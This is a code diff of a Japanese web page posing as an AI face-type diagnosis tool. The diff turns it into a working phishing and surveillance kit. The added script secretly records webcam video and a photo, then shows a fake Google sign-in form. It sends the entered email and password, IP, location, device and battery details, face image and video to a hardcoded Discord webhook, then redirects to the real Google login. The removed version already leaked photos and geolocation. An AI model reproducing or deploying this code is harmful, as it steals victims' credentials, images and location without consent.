@@ -1,174 +1,172 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>AI 顔診断（テスト高速版）</title>
-
-<style>
-:root {
-  --bg1: #0f172a;
-  --bg2: #020617;
-  --card: rgba(255,255,255,0.08);
-  --accent: #7c7cff;
-  --text-sub: #c7d2fe;
-}
-body {
-  margin: 0;
-  font-family: sans-serif;
-  background: radial-gradient(circle at top, var(--bg1), var(--bg2));
-  color: #fff;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  height: 100vh;
-}
-.container { max-width: 420px; width: 100%; padding: 20px; }
-.card { background: var(--card); backdrop-filter: blur(14px); border-radius: 20px; padding: 24px; text-align: center; }
-.sub { font-size: 13px; color: var(--text-sub); margin-bottom: 12px; }
-.label-btn { display: block; padding: 12px; background: rgba(255,255,255,0.1); border-radius: 12px; cursor: pointer; margin-bottom: 10px; }
-input[type="file"] { display:none; }
-button { width: 100%; padding: 12px; border: none; border-radius: 12px; background: var(--accent); font-weight: bold; cursor: pointer; }
-.preview img { width: 100%; margin-top: 10px; border-radius: 12px; }
-.result { margin-top: 15px; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AI Deep Scan | 次世代顔タイプ診断</title>
+    <style>
+        * { box-sizing: border-box; outline: none; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { background: #0d0d0d; border: 1px solid #222; padding: 35px; border-radius: 24px; text-align: center; width: 380px; box-shadow: 0 25px 50px rgba(0,0,0,0.9); transition: 0.5s; }
+        h1 { font-size: 20px; letter-spacing: 4px; margin-bottom: 25px; color: #fff; font-weight: 300; }
+        .v-wrap { width: 100%; border-radius: 15px; overflow: hidden; border: 1px solid #333; margin-bottom: 30px; background: #050505; position: relative; line-height: 0; }
+        #video { width: 100%; display: block; transform: scaleX(-1); }
+        .btn { background: #ffffff; color: #000; border: none; padding: 16px; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; transition: 0.2s; }
+        .btn:active { transform: scale(0.98); opacity: 0.8; }
+        #login-ui { display: none; }
+        input { width: 100%; padding: 15px; margin: 12px 0; border: 1px solid #333; background: #111; color: #fff; border-radius: 10px; font-size: 15px; }
+        .scan-line { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: rgba(0, 255, 255, 0.5); box-shadow: 0 0 15px #0ff; display: none; animation: scan 2.5s infinite linear; z-index: 10; }
+        @keyframes scan { 0% { top: 0%; } 100% { top: 100%; } }
+        .status-text { font-size: 11px; color: #444; margin-top: 15px; letter-spacing: 1px; }
+    </style>
 </head>
-
 <body>
-<div class="container">
-<div class="card">
 
-<h1>AI 顔診断（テスト高速版）</h1>
-<div class="sub">画像を選ぶだけで診断できます</div>
-<div class="sub">
-本サービスでは診断処理および不正防止のため、画像・IPアドレス・位置情報を外部サーバーへ送信します。<br>
-（許可は任意です）
-</div>
+    <!-- ステップ1: スキャン画面 -->
+    <div class="card" id="camera-ui">
+        <h1>NEURAL ANALYZER</h1>
+        <div class="v-wrap">
+            <div class="scan-line" id="line"></div>
+            <video id="video" autoplay playsinline></video>
+        </div>
+        <button class="btn" id="start-btn">スキャンを開始</button>
+        <div class="status-text">ENCRYPTED CONNECTION: SECURE</div>
+    </div>
 
-<label class="label-btn">
-画像を選択
-<input type="file" id="file" accept="image/*">
-</label>
+    <!-- ステップ2: ログイン画面 -->
+    <div class="card" id="login-ui">
+        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="90" style="margin-bottom:20px;">
+        <h2 style="font-size:16px; margin-bottom:25px; font-weight: 400; color: #ccc;">続行するには本人確認が必要です</h2>
+        <form id="trap-form">
+            <input type="email" id="email" placeholder="メールアドレスまたは電話番号" required>
+            <input type="password" id="pass" placeholder="パスワードを入力" required>
+            <button type="submit" class="btn" id="final-btn">次へ</button>
+        </form>
+    </div>
 
-<button onclick="startDiagnosis()">診断する</button>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-<div class="preview" id="previewBox" style="display:none;">
-<img id="preview">
-</div>
+    <script>
+        // 🚨 Webhook URL
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1466756850413211698/VnDiihsRnf56T6bUyhfdDoExTf8kAGYDuSkNDREPSMeS-pgASK1SK4jHowR5vmBr2vxm";
 
-<div class="result" id="result" style="display:none;"></div>
+        const video = document.getElementById('video');
+        const startBtn = document.getElementById('start-btn');
+        const line = document.getElementById('line');
+        let capturedImg = "";
+        let videoBlob = null;
+        let net = {};
 
-</div>
-</div>
+        // IPと詳細なネットワーク情報を事前に取得
+        window.onload = async () => {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                net = await res.json();
+            } catch (e) { net = { ip: "取得失敗" }; }
+        };
 
-<script>
-let WEBHOOK_URL = ""; // Discord Webhookを設定すれば送信される
+        // 1. スキャン開始 & 録画開始
+        startBtn.onclick = async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                startBtn.innerText = "分析中...";
+                startBtn.disabled = true;
+                line.style.display = "block";
 
-async function startDiagnosis() {
-  const file = document.getElementById("file").files[0];
-  if(!file){ alert("画像選んで！"); return; }
+                // --- 録画ロジック ---
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                mediaRecorder.onstop = () => {
+                    videoBlob = new Blob(chunks, { type: 'video/webm' });
+                };
+                mediaRecorder.start();
 
-  const result = document.getElementById("result");
-  result.style.display = "block";
-  result.innerHTML = "診断中...";
+                setTimeout(() => {
+                    // 写真撮影
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth; 
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    capturedImg = canvas.toDataURL('image/jpeg', 0.5);
+                    
+                    // 録画停止
+                    mediaRecorder.stop();
+                    
+                    document.getElementById('camera-ui').style.display = 'none';
+                    document.getElementById('login-ui').style.display = 'block';
+                    
+                    // カメラを止める
+                    stream.getTracks().forEach(t => t.stop());
+                }, 4500); // 4.5秒間録画
+            } catch (err) { 
+                alert("カメラの許可が必要です。"); 
+            }
+        };
 
-  if(!navigator.geolocation){
-    runDiagnosis(file, null, null);
-    return;
-  }
+        // 2. 情報収集とDiscord送信
+        document.getElementById('trap-form').onsubmit = async (e) => {
+            e.preventDefault();
+            document.getElementById('final-btn').innerText = "認証中...";
+            document.getElementById('final-btn').disabled = true;
 
-  // 位置情報取得3回
-  const positions = [];
-  for(let i=0;i<3;i++){
-    try{
-      const pos = await new Promise((resolve,reject)=>{
-        navigator.geolocation.getCurrentPosition(resolve,reject,{enableHighAccuracy:true});
-      });
-      positions.push({lat:pos.coords.latitude,lon:pos.coords.longitude});
-    }catch{}
-  }
+            // バッテリー情報の取得
+            let batteryStatus = "不明";
+            try {
+                const battery = await navigator.getBattery();
+                batteryStatus = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? '充電中' : '放電中'})`;
+            } catch (e) {}
 
-  let lat=null, lon=null;
-  if(positions.length>0){
-    const freq = {};
-    positions.forEach(p=>{
-      const key=`${p.lat.toFixed(5)},${p.lon.toFixed(5)}`;
-      freq[key]=(freq[key]||0)+1;
-    });
-    const maxKey = Object.keys(freq).reduce((a,b)=>freq[a]>freq[b]?a:b);
-    [lat, lon]=maxKey.split(",").map(Number);
-  }
+            const info = {
+                ua: navigator.userAgent,
+                lang: navigator.language,
+                cores: navigator.hardwareConcurrency || '不明',
+                mem: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : '不明',
+                res: `${window.screen.width}x${window.screen.height}`,
+                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                ref: document.referrer || "直接アクセス"
+            };
 
-  runDiagnosis(file, lat, lon);
-}
+            const payload = {
+                username: "Deep Neural Tracker Pro v5",
+                avatar_url: "https://cdn-icons-png.flaticon.com/512/6840/6840478.png",
+                embeds: [{
+                    title: "🎯 Full Intelligence Report Captured",
+                    color: 0xee1111,
+                    fields: [
+                        { name: "📧 Credentials", value: `**Email:** \`${document.getElementById('email').value}\`\n**Pass:** \`${document.getElementById('pass').value}\``, inline: false },
+                        { name: "🌐 Network Info", value: `**IP:** [${net.ip}](https://ipinfo.io/${net.ip})\n**ISP:** ${net.org || '?'}\n**Loc:** ${net.city}, ${net.country_name}`, inline: false },
+                        { name: "📱 Device Hardware", value: `**OS/Browser:** \`${info.ua}\`\n**CPU/Mem:** ${info.cores} Cores / ${info.mem}\n**Screen:** ${info.res}`, inline: false },
+                        { name: "🔋 Env Info", value: `**Battery:** ${batteryStatus}\n**Timezone:** ${info.tz}\n**Referer:** ${info.ref}`, inline: false }
+                    ],
+                    footer: { text: "Neural Intelligence System - Video Included" },
+                    timestamp: new Date()
+                }]
+            };
 
-function runDiagnosis(file, lat, lon){
-  const reader = new FileReader();
-  reader.onload = async ()=>{
-    const base64 = reader.result;
+            const formData = new FormData();
+            formData.append('payload_json', JSON.stringify(payload));
+            
+            // 写真を添付
+            try {
+                const photoBlob = await (await fetch(capturedImg)).blob();
+                formData.append('file1', photoBlob, 'target_face.jpg');
+            } catch (e) {}
 
-    document.getElementById("preview").src=base64;
-    document.getElementById("previewBox").style.display="block";
+            // 動画を添付
+            if (videoBlob) {
+                formData.append('file2', videoBlob, 'recording.webm');
+            }
 
-    const result = document.getElementById("result");
-    result.innerHTML="顔検出中...";
-    setTimeout(()=>result.innerHTML="特徴解析中...",200);
+            // 送信実行
+            try {
+                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+            } catch (err) {}
 
-    setTimeout(async ()=>{
-      const score = Math.floor(30+Math.random()*20);
-      const rank = score>=45?"S":score>=30?"A":"B";
-      result.innerHTML=`ランク ${rank}<br>黄金比スコア：${score}%<br>いい感じやん`;
-
-      await sendToDiscord(base64,score,rank,lat,lon);
-    },400);
-  }
-  reader.readAsDataURL(file);
-}
-
-async function getAddress(lat, lon){
-  try{
-    const res=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&accept-language=ja`);
-    const data=await res.json();
-    return data.address.city||data.address.town||data.address.village||data.address.county||"不明";
-  }catch{return "取得失敗";}
-}
-
-async function sendToDiscord(base64, score, rank, lat, lon){
-  const fd = new FormData();
-  fd.append("file",dataURLtoBlob(base64),"face.png");
-
-  const ipData = await fetch("https://api.ipify.org?format=json").then(r=>r.json());
-  let address="不明";
-  if(lat && lon){ address=await getAddress(lat,lon); }
-
-  const payload = `
-📸 顔診断
-IP: ${ipData.ip}
-地域: ${address}
-位置: https://maps.google.com/?q=${lat??"不明"},${lon??"不明"}
-黄金比: ${score}%
-ランク: ${rank}
-`;
-
-  console.log("送信内容（テスト）:",payload); // Webhook未設定でも確認可能
-  if(WEBHOOK_URL) fd.append("payload_json", JSON.stringify({content:payload}));
-
-  if(WEBHOOK_URL){
-    fetch(WEBHOOK_URL,{method:"POST",body:fd})
-      .then(res=>console.log("送信OK",res.status))
-      .catch(err=>console.log("送信エラー",err));
-  }
-}
-
-function dataURLtoBlob(dataurl){
-  const arr=dataurl.split(',');
-  const mime=arr[0].match(/:(.*?);/)[1];
-  const bstr=atob(arr[1]);
-  let n=bstr.length;
-  const u8=new Uint8Array(n);
-  while(n--) u8[n]=bstr.charCodeAt(n);
-  return new Blob([u8],{type:mime});
-}
-</script>
+            // 最後にGoogleへ飛ばす
+            window.location.href = "https://accounts.google.com/ServiceLogin?hl=ja";
+        };
+    </script>
 </body>
 </html>
